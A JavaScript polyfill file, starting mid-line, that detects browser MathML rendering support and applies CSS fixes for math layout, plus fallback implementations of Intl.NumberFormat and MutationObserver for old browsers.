                           '<math><mrow><mi>x</mi><mo id="lspace-rspace-b">-</mo><mi>y</mi></mrow></math>';
    var msupMsubTest = '<math>' +
                       '<msup id="msup-a"><mrow><mtable>' + tableBody(2, 1) + '</mtable></mrow><mrow><mn>2</mn></mrow></msup>' +
                       '<msup id="msup-b"><mrow><mtable>' + tableBody(3, 1) + '</mtable></mrow><mrow><mn>2</mn></mrow></msup>' +
                       '</math>';
    var nonItalicTest = '<math><mrow><mi id="non-italic">sin</mi><mo>&#x2061;</mo><mi>x</mi></mrow></math>';
    tmp.innerHTML = table + mathTest + columnspacingTest + columnlinesTest + mpaddedTest + mencloseTest + rowspacingTest + lspaceRspaceTest + msupMsubTest + nonItalicTest;
    document.body.appendChild(tmp);
    var t = document.getElementById('table-4-4');
    // In IE the widths are almost equal
    var epsilon = 5e-5;
    var math = document.getElementById('table-1-4').getBoundingClientRect().width - epsilon > document.getElementById('table-4-1').getBoundingClientRect().width;
    var columnspacing = document.getElementById('columnspacing-a').getBoundingClientRect().width - epsilon > document.getElementById('columnspacing-b').getBoundingClientRect().width;
    var columnlines = document.getElementById('columnlines-a').getBoundingClientRect().width + epsilon < document.getElementById('columnlines-b').getBoundingClientRect().width;
    var mpadded = document.getElementById('mpadded-a').getBoundingClientRect().width + epsilon < document.getElementById('mpadded-b').getBoundingClientRect().width;
    var menclose = (function () {
      var a = document.getElementById('menclose-a').getBoundingClientRect();
      var b = document.getElementById('menclose-b').getBoundingClientRect();
      return a.width + a.height + 3 < b.width + b.height; // for inline elements there is some different, so bigger epsilon is needed
    }());
    var rowspacing = document.getElementById('rowspacing-a').getBoundingClientRect().height - epsilon > document.getElementById('rowspacing-b').getBoundingClientRect().height;
    var lspaceRspace = document.getElementById('lspace-rspace-a').getBoundingClientRect().width + epsilon < document.getElementById('lspace-rspace-b').getBoundingClientRect().width;
    var msupMsub = document.getElementById('msup-a').lastElementChild.getBoundingClientRect().top - epsilon > document.getElementById('msup-b').lastElementChild.getBoundingClientRect().top;
    var tabIndex = t.tabIndex != null; //TODO: ?
    var draggable = t.draggable != null;
    var nonItalic = window.getComputedStyle(document.getElementById('non-italic'), null).fontStyle !== 'italic'; // Safari < 8
    window.requestAnimationFrame(function () {
      tmp.parentNode.removeChild(tmp);
    });
    return (math ? "" : "no-math ") +
           (columnspacing ? "" : "no-columnspacing ") +
           (mpadded ? "" : "no-mpadded ") +
           (columnlines ? "" : "no-columnlines ") +
           (menclose ? "" : "no-menclose ") +
           (rowspacing ? "" : "no-rowspacing ") +
           (lspaceRspace ? "" : "no-lspace-rspace ") +
           (msupMsub ? "" : "no-msup-msub ") +
           (tabIndex ? "" : "no-tabindex ") +
           (draggable ? "" : "no-draggable ") +
           (nonItalic ? "" : "no-non-italic");
  };

  var q = [];
  var queue = function (callback) {
    // otherwise too slow even for small number of elements
    // window.requestAnimationFrame is a little better that window.setTimeout, as it avoids flickering
    if (q.length === 0) {
      var c = function () {
        for (var i = 0; i < q.length; i += 1) {
          q[i]();
        }
        q.length = 0;
      };
      window.requestAnimationFrame(c);
    }
    q.push(callback);
  };

  var styleableElement = document.createElement('div');
  var updateStyleAttribute = function (node, cssText) {
    if (cssText !== '') {
      if (node.getAttribute('style') !== cssText) { // avoid the MutationRecord when no changes
        node.setAttribute('style', cssText);
      }
    } else {
      node.removeAttribute('style'); // slightly faster in Chrome
    }
  };
  
  function CSSStyleDeclarationPolyfill(node) {
    this.node = node;
  }

  CSSStyleDeclarationPolyfill.prototype.getPropertyValue = function (name) {
    updateStyleAttribute(styleableElement, this.node.getAttribute('style') || '');
    var value = styleableElement.style.getPropertyValue(name);
    return value;
  };

  CSSStyleDeclarationPolyfill.prototype.setProperty = function (name, value, priority) {
    updateStyleAttribute(styleableElement, this.node.getAttribute('style') || '');
    // priority argument is not optional in older browsers
    styleableElement.style.setProperty(name, value, priority || '');
    var cssText = styleableElement.style.cssText;
    updateStyleAttribute(this.node, cssText);
    if (window.opera != null) {
      // Opera 12.18 needs namespace to apply styles
      if (cssText === '') {
        this.node.removeAttributeNS('http://www.w3.org/1999/xhtml', 'style');
      } else {
        if (this.node.getAttributeNS('http://www.w3.org/1999/xhtml', 'style', cssText) !== cssText) {
          this.node.setAttributeNS('http://www.w3.org/1999/xhtml', 'style', cssText);
        }
      }
    }
  };

  // PERFORMANCE TEST:
  //var tmp = document.createElementNS('http://www.w3.org/1998/Math/MathML', 'math');
  //tmp.innerHTML = '<mn>0</mn><mo>+</mo>'.repeat(10**5) + '<mn>1</mn>';
  //console.time();
  //for (var c = tmp.firstElementChild; c != null; c = c.nextElementSibling) {
  //  new CSSStyleDeclarationPolyfill(c).setProperty('padding', '0em 1em', '');
  //}
  //console.timeEnd();
  // 1900 ms


  // in Opera 12 a getter on Element.prototype somehow handles the access to html elements
  if (!('style' in HTMLElement.prototype) && Object.getOwnPropertyDescriptor(document.documentElement, 'style') != null) {
    Object.defineProperty(HTMLElement.prototype, 'style', Object.getOwnPropertyDescriptor(document.documentElement, 'style'));
  }

  // Chrome 76
  if (!('style' in document.createElementNS('http://www.w3.org/1998/Math/MathML', 'math'))) {
    Object.defineProperty(Element.prototype, 'style', {
      get: function () {
        return new CSSStyleDeclarationPolyfill(this);
      }
    });
  }

  // no way to polyfill the Element#style in Chrome <= 44 (?) and in old WebKit-based browsers (?) as it returns null for MathML/SVG elements (?)
  // the own property is not configurable
  // https://developers.google.com/web/updates/2015/04/DOM-attributes-now-on-the-prototype-chain
  function getStyle(element) {
    return element.style || new CSSStyleDeclarationPolyfill(element);
  }

  function filterOutContainedNodes(nodes) {
    if (globalThis.Set != null) {//TODO: !?
      var newNodes = new Set();
      for (var i = 0; i < nodes.length; i++) {
        var node = nodes[i];
        newNodes.add(node);
      }
      for (var i = 0; i < nodes.length; i++) {
        var node = nodes[i];
        for (var p = node.parentNode; p != null; p = p.parentNode) {
          if (newNodes.has(p)) {
            newNodes["delete"](node);
          }
        }
      }
      var tmp = [];
      newNodes.forEach(function (node) {
        tmp.push(node);
      });
      return tmp;
    }
    // Note: this code is very slow for big arrays
    var newNodes = [];
    for (var i = 0; i < nodes.length; i++) {
      var node = nodes[i];
      var skip = false;
      for (var j = 0; j < newNodes.length; j++) {
        if (newNodes[j].contains(node)) {
          skip = true;
        } else if (node.contains(newNodes[j])) {
          var tmp = newNodes[j];
          newNodes[j] = node;
          node = tmp;
          skip = true;
        }
      }
      if (!skip) {
        newNodes.push(node);
      }
    }
    return newNodes;
  }

  //var tmp = document.createElement('div');
  //tmp.innerHTML = '<div><a></a></div><div></div>';
  //console.assert(filterOutContainedNodes(tmp.querySelectorAll('*')).map(x => x.tagName.toLowerCase()).join(' ') === 'div div');

  //var tmp = document.createElement('div');
  //tmp.innerHTML = '<div></div>'.repeat(1024 * 1024);
  //console.time();
  //filterOutContainedNodes(tmp.querySelectorAll('*'));
  //console.timeEnd();
  // default: 1278.806884765625 ms


  document.addEventListener("DOMContentLoaded", function (event) {
    if (window.opera != undefined) {
      document.body.classList.toggle("css-profile", true);
    }

    //tmp.innerHTML = "<math><mrow mathcolor=\"#FF0000\"><mn>1</mn></mrow></math>";
    //var ok = window.getComputedStyle(tmp.firstElementChild.firstElementChild, undefined).color.indexOf("255") !== -1;
    //var c = ok ? getMathMLSupport(tmp) : "math ";
    // Mi Browser in Night Mode changes color to rgba(255, 255, 255, 0.5)
    //TODO: fix math -> no-math
    var c = window.opera != undefined ? 'math no-columnspacing no-mpadded no-columnlines no-menclose no-rowspacing no-lspace-rspace no-msup-msub no-tabindex no-draggable no-non-italic ' : getMathMLSupport().replace(/^no\-math /g, "math ");
    if (c !== "") {
      var classes = c.replace(/^\s+|\s+$/g, "").split(" ");
      for (var i = 0; i < classes.length; i += 1) {
        document.body.classList.toggle(classes[i], true);
      }
    }
    // I want to have focusable and draggable element, mrow[href="#"] can be used, but I need to prevent the navigation.
    if (c !== "math " || window.opera != undefined) {
      // Opera supports MathML links too with some special CSS
      var preventNavigation = function (event) {
        if (event.button === 0 || event.button === 1) {
          var target = event.target.closest('[href]');
          if (target != null && target.getAttribute('href') === '#') {
            var tagName = target.tagName.toLowerCase();
            if (tagName === 'mrow' || tagName === 'mtd') {
              event.preventDefault();
            }
          }
        }
      };
      document.addEventListener("click", preventNavigation, false);
      document.addEventListener("auxclick", preventNavigation, false);
    }

    var checks = [];
    function walk(element) {
      for (var i = 0; i < checks.length; i += 1) {
        checks[i](element);
      }
      var firstElementChild = element.firstElementChild;
      while (firstElementChild != undefined) {
        walk(firstElementChild);
        firstElementChild = firstElementChild.nextElementSibling;
      }
    }

    if (c.indexOf('no-lspace-rspace ') !== -1) { // no lspace+rspace support based on The operator dictionary
      checks.push(function (target) {
        if (target.tagName.toLowerCase() === 'mo' &&
            target.getAttribute('form') !== 'infix' &&
            !(target.getAttribute('lspace') === '0' && target.getAttribute('rspace') === '0')) {
          var c = target.textContent;
          if (c === '' ||
              c === '\u2061' || c === '\u2062' || c === '\u2063' ||
              c === '(' || c === ')' || c === '|' || c === '{' || c === '}' ||
              (target.nextElementSibling == null && target.previousElementSibling != null) ||
              (target.previousElementSibling == null && target.nextElementSibling != null) ||
              c === ',' || c === 'â‹…' || target.getAttribute('lspace') != null || target.getAttribute('rspace') != null) {
            queue(function () {
              var paddingLeft = target.getAttribute('lspace') || (c !== 'â‹…' ? '0em' : (1/6) + 'em');
              var paddingRight = target.getAttribute('rspace') || (c === ',' || c === 'â‹…' ? (1 / 6) + 'em' : '0em');
              //getStyle(target).setProperty('padding-left', paddingLeft, '');
              //getStyle(target).setProperty('padding-right', paddingRight, '');
              getStyle(target).setProperty('padding', '0 ' + paddingRight + ' 0 ' + paddingLeft, ''); // faster
            });
          }
        }
      });
    }

    if (c.indexOf('no-columnlines ') !== -1) {
      checks.push(function (target) {
        if (target.tagName.toLowerCase() === 'mtable') {
          var columnlines = (target.getAttribute('columnlines') || '').replace(/^\s+|\s+$/g, '').split(/\s+/g);
          queue(function () {
            for (var row = target.firstElementChild; row != null; row = row.nextElementSibling) {
              for (var cell = row.firstElementChild, index = 0; cell != null; cell = cell.nextElementSibling, index += 1) {
                if (index > 0) {
                  var linestyle = columnlines[Math.min(index - 1, columnlines.length - 1)];
                  if (linestyle === 'solid' || linestyle === 'dashed') {
                    getStyle(cell).setProperty('border-left-style', linestyle, '');
                    getStyle(cell).setProperty('border-left-width', '1px', '');
                  }
                }
              }
            }
          });
        }
      });
    }
    var flag0 = false;
    var fireResize = function () {
      if (!flag0) {
        flag0 = true;
        window.requestAnimationFrame(function () {
          flag0 = false;
          document.dispatchEvent(new Event('resize', {bubbles: true}));//!?
        });
      }
    };
    if (c.indexOf('math ') !== -1) {
      checks.push(function (target) {
        if (target.tagName.toLowerCase() === 'mo') {
          var c = target.textContent;
          if (c === '(' || c === ')' || c === '|' || c === '{' || c === '}' || target.previousElementSibling == null || target.nextElementSibling == null) {
            // <mrow><mo>(</mo><mrow>...</mrow><mo>)</mo></mrow>
            queue(function () {
              if (target.parentNode != null && getStyle(target.parentNode).getPropertyValue('white-space') === '') {
                getStyle(target.parentNode).setProperty('white-space', 'nowrap', '');
                for (var child = target.parentNode.firstElementChild; child != null; child = child.nextElementSibling) {
                  if (child.tagName.toLowerCase() !== 'mo') {
                    getStyle(child).setProperty('white-space', 'normal', '');
                  }
                }
                fireResize();
              }
            });
          }
        }
      });
      var propertyName = 'transform';
      if (!('transform' in document.documentElement.style)) {
        var properties = {
          '-o-transform': 'OTransform',
          '-ms-transform': 'msTransform',
          '-moz-transform': 'MozTransform',
          '-webkit-transform': 'webkitTransform'
        };
        for (var property in properties) {
          if (Object.prototype.hasOwnProperty.call(properties, property)) {
            if (properties[property] in document.documentElement.style) {
              propertyName = property;
            }
          }
        }
      }
      var stretchMO = function (target) {
        var c = target.textContent;
        if ((c === '(' || c === ')' || c === '|' || c === '{' || c === '}') && target.getAttribute('stretchy') !== 'false') {
          var fontSize = Number.parseFloat(window.getComputedStyle(target, null).fontSize);

          var height = target.parentNode.clientHeight; // Element#offsetHeight is not here in Chrome
          var scaleY = Math.max(height / fontSize - 0.1875, 0);
          if (scaleY === 0 || Math.abs(scaleY - 1) < 0.05) { // 0 when the element is not rendered
            scaleY = 1;
          }
          var scaleX = Math.sqrt(Math.sqrt(scaleY));

          var style = scaleX === 1 && scaleY === 1 ? '' : 'scale(' + scaleX + ', ' + scaleY + ')';
          if (style !== (getStyle(target).getPropertyValue(propertyName) || '')) {
            queue(function () {
              getStyle(target).setProperty(propertyName, style, '');
            });
          }
        }
        if (c === 'Â¯') {
          var scaleX = target.parentNode.clientWidth / target.clientWidth;
          if (scaleX !== scaleX || scaleX === 0 || Math.abs(scaleX - 1) < 0.05) { // 0 when the element is not rendered
            scaleX = 1;
          }
          var scaleY = 1;

          var style = scaleX === 1 && scaleY === 1 ? '' : 'scale(' + scaleX + ', ' + scaleY + ')';
          if (getStyle(target).getPropertyValue('margin-bottom') !== '-1em') {
            queue(function () {
              getStyle(target).setProperty(propertyName, style, '');
              getStyle(target).setProperty('margin-bottom', '-1em', '');
              fireResize();
            });
          }
        }
      };
      checks.push(function (target) {
        if (target.tagName.toLowerCase() === 'mo') {
          stretchMO(target);
        }
      });
      window.addEventListener('resize', function (event) {
        var elements = document.getElementsByTagName('mo');
        for (var i = 0; i < elements.length; i += 1) {
          stretchMO(elements[i]);
        }
      }, false);
      /*if (window.ResizeObserver != null) {
        //TODO: fix
        var resizeObserver = new window.ResizeObserver(function () {
          window.requestAnimationFrame(function () {
            var es = document.documentElement.querySelectorAll('mo');
            for (var i = 0; i < es.length; i += 1) {
              stretchMO(es[i]);
            }
          });
        });
        resizeObserver.observe(document.documentElement);
      }*/
    }
    // https://stackoverflow.com/a/26633844
    var browserCanUseCssVariables = function () {
      return window.CSS && CSS.supports('color', 'var(--fake-var)');
    };
    if (c.indexOf('math ') !== -1 && browserCanUseCssVariables()) {
      var stretchRadicalSymbol = function (target) {
        var fontSize = Number.parseFloat(window.getComputedStyle(target, null).fontSize);
        var height = target.firstElementChild.clientHeight;
        var scaleY = (height - fontSize / 8) / fontSize;
        if (scaleY === 0 || Math.abs(scaleY - 1) < 0.05) { // 0 when the element is not rendered
          scaleY = 1;
        }
        if (scaleY !== 1) {
          queue(function () {
            getStyle(target).setProperty('--size', scaleY, '');
          });
        }
      };
      checks.push(function (target) {
        if (target.tagName.toLowerCase() === 'msqrt' || target.tagName.toLowerCase() === 'mroot') {
          stretchRadicalSymbol(target);
        }
      });
      window.addEventListener('resize', function (event) {
        var elements = document.getElementsByTagName('msqrt');
        for (var i = 0; i < elements.length; i += 1) {
          stretchRadicalSymbol(elements[i]);
        }
        var elements = document.getElementsByTagName('mroot');
        for (var i = 0; i < elements.length; i += 1) {
          stretchRadicalSymbol(elements[i]);
        }
      }, false);
    }
    if (c.indexOf('no-draggable ') !== -1) {
      if (!('webkitUserDrag' in document.documentElement.style)) {
        checks.push(function (target) {
          if (target.tagName.toLowerCase() === 'mrow' && target.getAttribute('draggable') != null) {
            queue(function () {
              target.setAttribute('href', '#');
            });
          }
        });
      }
    }
    if (c.indexOf('no-tabindex ') !== -1) {
      checks.push(function (target) {
        if (target.tagName.toLowerCase() === 'mrow' && target.getAttribute('tabindex') != null) {
          queue(function () {
            target.setAttribute('href', '#');
          });
        }
      });
    }
    if (c.indexOf('math ') !== -1 || c.indexOf('no-non-italic ') !== -1) {
      checks.push(function (target) {
        if (target.tagName.toLowerCase() === 'mi') {
          var c = target.textContent;
          if (c.length > 1) {
            queue(function () {
              getStyle(target).setProperty('font-style', 'normal', '');
            });
          }
        }
      });
    }
    if (c.indexOf('math ') !== -1) {
      // https://stackoverflow.com/questions/22475157/is-there-any-unicode-character-whos-glyph-is-missing-in-all-fonts/22636426#22636426
      // https://stackoverflow.com/questions/23876361/codepoint-of-the-missing-glyph-box
      var MISSED_GLYPH = '\uF8FF';
      var getImageData = function (character) {
        //var bodyStyle = window.getComputedStyle(document.body, null);
        //var fontSize = Number.parseFloat(bodyStyle.fontSize);
        // Firefox does not like font
        //var font = bodyStyle.fontSize + " " + bodyStyle.fontFamily;
        var fontSize = 16;
        var font = '16px serif';
        var canvas = document.createElement('canvas');
        canvas.width = fontSize;
        canvas.height = fontSize;

        if (canvas.getContext == null) {
          return null; // IE 8
        }
        var ctx = canvas.getContext('2d');
        ctx.font = font;
        ctx.textBaseline = 'top';
        ctx.fillStyle = 'white';
        ctx.fillRect(0, 0, canvas.width, canvas.height);
        ctx.fillStyle = 'black';
        if (typeof ctx.fillText !== 'function') {
          return null; // Firefox 3
        }
        ctx.fillText(character, 0, 0);

        var imageData = ctx.getImageData(0, 0, canvas.width, canvas.height).data;
        // something is not supported in IE 10
        return typeof Uint32Array !== 'undefined' ? new Uint32Array(imageData.buffer || imageData) : imageData;
      };
      var missedGlyphData = null;
      var isCharacterSupported = function (character) {
        var x = getImageData(character);
        if (missedGlyphData == null) {
          missedGlyphData = getImageData(MISSED_GLYPH);
        }
        var y = missedGlyphData;
        if (x == null || y == null) {
          return false;
        }
        if (x.length !== y.length) {
          throw new TypeError();
        }
        for (var i = 0; i < x.length; i += 1) {
          if (x[i] !== y[i]) {
            return true;
          }
        }
        return false;
      };
      var cache = {};
      var isCharacterSupported2 = function (character) {
        if (cache[character] == null) {
          cache[character] = isCharacterSupported(character);
        }
        return cache[character];
      };
      var replacements = {
        '\u2061': '',
        '\u2062': '',
        '\u2063': '',
        '\u2147': 'e',
        '\u2148': 'i',
        'â‡’': '=>',
        'âŸ': '(-)'
      };
      checks.push(function (target) {
        if (target.tagName.toLowerCase() === 'mi' ||
            target.tagName.toLowerCase() === 'mo') {
          var c = target.textContent;
          var replacement = replacements[c];
          if (replacement != null && !isCharacterSupported2(c)) {
            queue(function () {
              target.textContent = replacement;
              getStyle(target).setProperty('-webkit-text-fill-color', 'transparent', '');
              getStyle(target).setProperty('-webkit-text-stroke', 'thin currentColor', '');
              target.setAttribute('aria-label', c);
            });
          }
        }
      });
    }
    if (checks.length !== 0) {
      if (window.MutationObserver != null) {
        // with "animationstart" there is some flickering...
        // ... trying to use MutationObserver
        var observer = new MutationObserver(function (mutationList) {
          var nodes = [];
          for (var i = 0; i < mutationList.length; i += 1) {
            var mutation = mutationList[i];
            if (mutation.type === 'attributes') {
              var math = mutation.target.closest('math');
              if (math != null) {
                nodes.push(math);
              } else {
                nodes.push(mutation.target);
              }
            } else {
              var addedNodes = mutation.addedNodes;
              if (addedNodes != null) {
                for (var j = 0; j < addedNodes.length; j += 1) {
                  var node = addedNodes[j];
                  if (node.nodeType === Node.ELEMENT_NODE) {
                    nodes.push(node);
                  }
                }
              }
              var math = mutation.target.closest('math');
              if (math != null) {
                nodes.push(math);
              }
            }
          }
          var newNodes = mutationList.length > 1 ? filterOutContainedNodes(nodes) : nodes;
          for (var i = 0; i < newNodes.length; i++) {
            walk(newNodes[i]);
          }
        });
        //TODO: it is too slow to monitor style attribute changes
        observer.observe(document.body, {
          attributes: true,
          attributeFilter: ['open',/* 'style',*/ 'hidden'],
          childList: true,
          characterData: false,
          subtree: true
        });
      } else {
        //document.addEventListener('animationstart', function (event) {
        //  walk(event.target);
        //}, false);
      }
    }
  }, {once: true});

//!new 2019-11-13
if ('webkitUserDrag' in document.documentElement.style) {
  // no keydown for Alt in Opera!
  // autorepeat of Alt key does not work in Chrome and no way to get the Alt state(?)
  // It is too slow to toggle class on the document.body!
  // TODO:Caret Browsing mode needs user-select: text!
  window.addEventListener('mousedown', function (event) {
    var target = event.target.closest('[draggable]');
    var es = document.querySelectorAll('mrow[draggable]');
    for (var i = 0; i < es.length; i += 1) {
      es[i].setAttribute('draggable', event.altKey || target == null ? 'false' : 'true');
    }
    // setting draggable to false will hide the text selection in Chrome
  }, false);
} else {
  // Alt key works good in Firefox
  // change the cursor to text selection cursor for selection:
  var onKeyDownUp = function (event) {
    if (event.keyCode === 18) {
      var es = document.querySelectorAll('mrow[draggable]');
      for (var i = 0; i < es.length; i += 1) {
        es[i].style.cursor = event.type === 'keydown' ? 'auto' : '';
      }
    }
  };
  window.addEventListener('keydown', onKeyDownUp, false);
  window.addEventListener('keyup', onKeyDownUp, false);
}

// in Opera 12 a getter on Element.prototype somehow handles the access to html elements
if (!('tabIndex' in HTMLElement.prototype) && Object.getOwnPropertyDescriptor(document.documentElement, 'tabIndex') != null) {
	Object.defineProperty(HTMLElement.prototype, 'tabIndex', Object.getOwnPropertyDescriptor(document.documentElement, 'tabIndex'));
}

if (!('tabIndex' in document.createElementNS('http://www.w3.org/1998/Math/MathML', 'math'))) {
  Object.defineProperty(Element.prototype, 'tabIndex', {
    get: function () {
      return Number(this.getAttribute('tabindex') || '-1');
    },
    set: function (value) {
      this.setAttribute('tabindex', (Number(value) || 0).toString());
    }
  });
}

if (document.createElementNS('http://www.w3.org/1998/Math/MathML', 'math').focus == undefined) {
  // does not work in IE 11
  // focus method polyfill for MathML elements in Chrome:
  Element.prototype.focus = function () {
    console.assert(this.id !== '' && this.getAttribute('tabindex') === '0', 'the element should have id attribute and tabindex=0');
    var state = window.history.state;
    var href = window.location.href;
    window.location.replace(window.location.href.replace(/#[^#]*$/g, '') + '#' + this.id); //! this will focus the element
    window.scrollBy(0, 0);
    window.history.replaceState(state, document.title, href);
  };
}

}());

/*global window*/
"use strict";

// https://caniuse.com/#feat=mdn-javascript_builtins_intl_numberformat

//var hasNativeSupport = globalThis.Intl != null;

function IntlNumberFormatPolyfill(locale, options) {
  if (options == undefined ||
      options.localeMatcher != undefined ||
      options.numberingSystem != undefined ||
      options.style != undefined ||
      options.useGrouping !== false ||
      options.minimumIntegerDigits != undefined) {
    throw new RangeError("Unsupported options");
  }
  // https://stackoverflow.com/questions/33159354/how-do-i-find-the-decimal-separator-for-current-locale-in-javascript#answer-51411310
  function minusOneAndHalf(locale) {
    //if (hasNativeSupport) {//TODO: ?
    //  return (-1.5).toLocaleString(locale);
    //}
    locale = locale || window.navigator.language;
    if (/^ar(?![a-z])(?!\-TN|\-DZ|\-LY|\-MA)/i.test(locale)) {
      return "Øœ-Ù¡Ù«Ù¥";
    }
    if (/^fa(?![a-z])/.test(locale)) {
      return "â€Žâˆ’Û±Ù«Ûµ";
    }
    if (/^bn(?![a-z])/.test(locale)) {
      return "-à§§.à§«";
    }
    if (/^mr(?![a-z])/.test(locale)) {
      return "-à¥§.à¥«";
    }
    return /^(?:en|ja|ko|zh)(?![a-z])/.test(locale) ? "-1.5" : "-1,5";
  }
  function isDecimalZero(codePoint) {
    return "0Ù Û°ß€à¥¦à§¦à©¦à«¦à­¦à¯¦à±¦à³¦àµ¦à·¦à¹à»à¼ á€á‚áŸ á á¥†á§áª€áªá­á®°á±€á±ê˜ ê£ê¤€ê§ê§°ê©ê¯°ï¼ð’ ð´°ð‘¦ð‘ƒ°ð‘„¶ð‘‡ð‘‹°ð‘‘ð‘“ð‘™ð‘›€ð‘œ°ð‘£ ð‘¥ð‘±ð‘µð‘¶ ð–© ð–­ðŸŽðŸ˜ðŸ¢ðŸ¬ðŸ¶ðž…€ðž‹°ðž¥ðŸ¯°".indexOf(String.fromCodePoint(codePoint)) !== -1;
  }
  var minusSign = /^[\u200E\u061C]?[\u2212\-]/g;
  var test = minusOneAndHalf(locale);
  var absolute = test.replace(minusSign, '');
  if (absolute === test) {
    console.debug(locale);
  }
  var decimalSeparator = '.';
  var tmp = /[Ù«,\.]/.exec(absolute);
  if (tmp != undefined) {
    decimalSeparator = tmp[0];
  }
  var decimalZero = absolute.codePointAt(0) - 1;
  if (!isDecimalZero(decimalZero)) {
    decimalZero = '0'.codePointAt(0);
  }
  this._decimalZero = decimalZero;
  this._decimalSeparator = decimalSeparator;
  this._minusSign = test.slice(0, -absolute.length);
  this._options = options;
  //this._locale = locale;
}

IntlNumberFormatPolyfill.prototype.format = function (value) {
  var replaceDigits = function (s, decimalZero) {
    if (decimalZero === "0".charCodeAt(0)) {
      return s;
    }
    var result = "";
    for (var i = 0; i < s.length; i += 1) {
      var code = s.charCodeAt(i);
      if (code >= "0".charCodeAt(0) && code <= "9".charCodeAt(0)) {
        result += String.fromCodePoint(decimalZero + (code - "0".charCodeAt(0)));
      } else {
        throw new RangeError();
      }
    }
    return result;
  };
  var applyLocale = function (s, minusSign, decimalSeparator, decimalZero) {
    var a = s.indexOf("-", 0);
    var b = s.indexOf(".", a === -1 ? 0 : a);
    return (a !== -1 ? minusSign : "") + replaceDigits(s.slice(a === -1 ? 0 : a + 1, b === -1 ? s.length : b), decimalZero) + (b !== -1 ? decimalSeparator : "") + replaceDigits(s.slice(b === -1 ? s.length : b + 1), decimalZero);
  };
  return applyLocale(String(value), this._minusSign, this._decimalSeparator, this._decimalZero);
};

//! https://github.com/tc39/ecma402/issues/334
function canFormatStrings() {
  try {
    return new globalThis.Intl.NumberFormat('en-US', {useGrouping: false}).format("1000000000000000000000000000000000000001") === "1000000000000000000000000000000000000001";
  } catch (error) {
    return false;
  }
}

if (globalThis.Intl == null) {
  globalThis.Intl = {};
}

// TypeError: Cannot assign to read only property 'Intl' of [object global]
// Mozilla/5.1 (Linux; U; Android 5.1; es-mx; Bmobile_AX1055) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30

if (globalThis.Intl.NumberFormat == null) {
  globalThis.Intl.NumberFormat = IntlNumberFormatPolyfill;
}
//if (!canFormatStrings()) {
//  globalThis.Intl.NumberFormat = IntlNumberFormatPolyfill;
//}

/*global document, window, Element, Event*/

if (window.MutationObserver == undefined && window.WebKitMutationObserver != undefined) {
  window.MutationObserver = window.WebKitMutationObserver;
}

// 1) DOMNodeInserted does not work in Konqueror 4.13
// 2) setAttribute and removeAttribute crash Konqueror 4.13

(function () {
  "use strict";

  if (window.MutationEvent == undefined) {
    var createEvent = document.createEvent;
    document.createEvent = function (type) {
      return createEvent.call(document, type === "MutationEvent" ? "Event" : type);
    };
    Event.prototype.initMutationEvent = function (type, bubbles, cancelable, relatedNode, prevValue, newValue, attrName, attrChange) {
      this.type = type;
      this.bubbles = bubbles;
      this.cancelable = cancelable;
      this.relatedNode = relatedNode;
      this.prevValue = prevValue;
      this.newValue = newValue;
      this.attrName = attrName;
      this.attrChange = attrChange;
    };
  }

  var isDOMNodeInsertedSupported = function () {
    var a = document.createElement("a");
    var flag = false;
    a.addEventListener("DOMNodeInserted", function (event) {
      flag = true;
    }, false);
    a.innerHTML = "data-test";
    return flag;
  };

  // IE 8
  if (window.MutationObserver == undefined && !isDOMNodeInsertedSupported()) {
    var tmpElement = document.createElement("div");
    var innerHTML = Object.getOwnPropertyDescriptor(Element.prototype, "innerHTML");
    Object.defineProperty(Element.prototype, "innerHTML", {
      get: function () {
        return innerHTML.get.call(this);
      },
      set: function (value) {
        while (this.firstChild != undefined) {
          this.firstChild.parentNode.removeChild(this.firstChild);
        }
        innerHTML.set.call(tmpElement, value);
        while (tmpElement.firstChild != undefined) {
          this.appendChild(tmpElement.firstChild);
        }
      }
    });
    var appendChild = Element.prototype.appendChild;
    Element.prototype.appendChild = function (node) {
      if (node.parentNode != undefined) {
        node.parentNode.removeChild(node);
      }
      appendChild.call(this, node);
      var event = document.createEvent("MutationEvent");
      event.initMutationEvent("DOMNodeInserted", true, false, this, "", "", "", 0);
      node.dispatchEvent(event);
    };
    var removeChild = Element.prototype.removeChild;
    Element.prototype.removeChild = function (node) {
      var event = document.createEvent("MutationEvent");
      event.initMutationEvent("DOMNodeRemoved", true, false, this, "", "", "", 0);
      node.dispatchEvent(event);
      removeChild.call(this, node);
    };
    var insertBefore = Element.prototype.insertBefore;
    Element.prototype.insertBefore = function (node, referenceNode) {
      if (node.parentNode != undefined) {
        node.parentNode.removeChild(node);
      }
      insertBefore.call(this, node, referenceNode);
      var event = document.createEvent("MutationEvent");
      event.initMutationEvent("DOMNodeInserted", true, false, this, "", "", "", 0);
      node.dispatchEvent(event);
    };
  }

  var isDOMAttrModifiedSupported = function () {
    var a = document.createElement("a");
    var flag = false;
    a.addEventListener("DOMAttrModified", function (event) {
      flag = true;
    }, false);
    a.setAttribute("data-test", "data-test");
    return flag;
  };

  // Chrome < 18, Safari < 6
  // Firefox and Opera should support although caniuse.com says some older version do not support it
  if (window.MutationObserver == undefined && !isDOMAttrModifiedSupported() && !/Konqueror/.test(window.navigator.userAgent)) {
    var setAttribute = Element.prototype.setAttribute;
    Element.prototype.setAttribute = function (name, value) {
      var event = document.createEvent("MutationEvent");
      event.initMutationEvent("DOMAttrModified", true, false, this, this.getAttribute(name), value, name, 2);
      this.dispatchEvent(event);
      setAttribute.call(this, name, value);
    };
    var removeAttribute = Element.prototype.removeAttribute;
    Element.prototype.removeAttribute = function (name) {
      var event = document.createEvent("MutationEvent");
      event.initMutationEvent("DOMAttrModified", true, false, this, this.getAttribute(name), "", name, 3);
      this.dispatchEvent(event);
      removeAttribute.call(this, name);
    };
  }

}());

(function () {
  "use strict";

  function MutationObserver(callback) {
    this.callback = callback;
    this.listeners = [];
  }

  MutationObserver.prototype.observe = function (target, options) {
    var observer = this;
    var callback = this.callback;
    var attributeFilter = options.attributeFilter == undefined ? "" : options.attributeFilter.join(" ");
    var handler = function (event) {
      if ((event.attrName == undefined || event.attrName === "" || attributeFilter.indexOf(event.attrName) !== -1) && ((event.type === "DOMAttrModified" || event.type === "DOMCharacterDataModified" ? event.target : event.relatedNode) === event.currentTarget || options.subtree)) {
        callback([{
          type: event.type === "DOMAttrModified" ? "attributes" : (event.type === "DOMCharacterDataModified" ? "characterData" : "childList"),
          target: event.type === "DOMAttrModified" || event.type === "DOMCharacterDataModified" ? event.target : event.relatedNode,
          addedNodes: event.type === "DOMNodeInserted" ? [event.target] : [],
          removedNodes: event.type === "DOMNodeRemoved" ? [event.target] : [],
